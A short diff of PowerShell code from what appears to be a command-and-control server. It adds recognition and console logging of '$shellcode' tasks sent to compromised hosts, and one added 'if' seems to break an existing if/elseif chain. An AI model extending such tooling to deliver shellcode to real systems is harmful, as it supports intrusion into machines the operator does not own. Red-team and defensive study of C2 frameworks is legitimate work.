@@ -326,6 +326,7 @@ if ($RestartC2Server)
     if ($resultsdb)
     {
         if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
+        if ($resultsdb.Command.tolower().startswith('$shellcode')) {}
         elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
         else 
         {
@@ -1504,13 +1505,14 @@ $message =[Convert]::ToBase64String($Bytes)
             foreach ($i in $multicmdresults) {
                 $taskid = $i.Command
                 $taskidtime = $i.TaskID
-
                 if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
                     Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
                     if  ($taskid.ToLower().startswith('upload-file')) {
-                    Write-Host -Object "Uploading File" -ForegroundColor Yellow
+                        Write-Host -Object "Uploading File" -ForegroundColor Yellow
+                    } elseif ($taskid.ToLower().startswith("`$shellcode")) {
+                        Write-Host "Uploading Shellcode: $hostname" -ForegroundColor Yellow
                     } else {
-                    Write-Host -Object $taskid -ForegroundColor Yellow
+                        Write-Host -Object $taskid -ForegroundColor Yellow
                     }
                 }
                 if ($taskid.ToLower().StartsWith("loadmodule")) 
